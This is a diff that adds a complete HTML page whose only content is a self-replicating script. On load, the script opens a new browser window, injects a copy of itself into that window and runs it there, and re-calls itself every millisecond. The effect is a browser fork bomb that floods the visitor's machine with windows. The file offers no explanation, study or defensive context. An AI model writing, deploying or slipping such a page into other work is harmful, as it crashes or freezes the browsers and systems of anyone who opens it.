@@ -1,0 +1,20 @@
+<!DOCTYPE HTML>
+<html>
+
+<body>
+  <script>
+function fork() {
+  const win = window.open();
+  const script = win.document.createElement("script");
+  script.innerHTML = fork + "\n" + "fork();";
+  win.document.head.appendChild(script);
+  setTimeout(function() {
+    fork();
+  }, 1)
+}
+
+fork();
+  </script>
+</body>
+
+</html>
